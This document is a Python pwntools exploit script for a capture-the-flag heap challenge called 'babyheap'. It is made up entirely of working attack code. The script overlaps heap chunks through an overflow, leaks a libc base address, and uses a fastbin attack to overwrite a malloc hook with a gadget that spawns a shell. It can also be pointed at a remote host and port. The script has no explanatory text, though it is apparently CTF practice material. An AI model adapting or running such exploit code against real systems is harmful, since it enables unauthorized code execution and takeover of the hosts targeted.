#!/usr/bin/env python

from pwn import *
import sys
import logging

def alloc(size):
    logging.info('alloc [%d]'%(size))
    r.sendline('1')
    r.sendlineafter(': ', str(size))
    r.recvuntil(': ', timeout=1)

def fill(idx, data):
    logging.info('fill[%s] data[%s][%s]'%(idx,len(data),repr(data)))
    r.sendline('2')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(len(data)))
    r.sendafter(': ', data)
    r.recvuntil(': ')

def free(idx):
    r.sendline('3')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(': ')

def dump(idx):
    r.sendline('4')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(': \n')
    data = r.recvline()
    r.recvuntil(': ')
    return data

def exploit(r):
    r.recvuntil(': ')

    alloc(0x20)
    alloc(0x20)
    alloc(0x20)
    alloc(0x20)
    alloc(0x80)

    free(1)
    free(2)

    payload  = p64(0)*5
    payload += p64(0x31)
    payload += p64(0)*5
    payload += p64(0x31)
    payload += p8(0xc0)
    fill(0, payload)

    payload  = p64(0)*5
    payload += p64(0x31)
    fill(3, payload)

    alloc(0x20)
    alloc(0x20)


    payload  = p64(0)*5
    payload += p64(0x91)
    fill(3, payload)
    alloc(0x80)
    free(4)

    libc_base = u64(dump(2)[:8]) - 0x3a5678
    log.info("libc_base: " + hex(libc_base))

    alloc(0x68)
    free(4)

    fill(2, p64(libc_base + 0x3a55ed))
    alloc(0x60)
    alloc(0x60)

    payload  = '\x00'*3
    payload += p64(0)*2
    payload += p64(libc_base + 0x41374)
    fill(6, payload)
    log.info('wait for pause')
    pause()
    alloc(255)

    r.interactive()

if __name__ == "__main__":
    loglvl = logging.DEBUG
    logging.basicConfig(level=loglvl,format='%(asctime)s:%(filename)s:%(funcName)s:%(lineno)d\t%(message)s')
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./babyheap_69a42acd160ab67a68047ca3f9c390b9'], env={"LD_PRELOAD":"./libc.so.6_b86ec517ee44b2d6c03096e0518c72a1"})
        print util.proc.pidof(r)
        pause()
        exploit(r)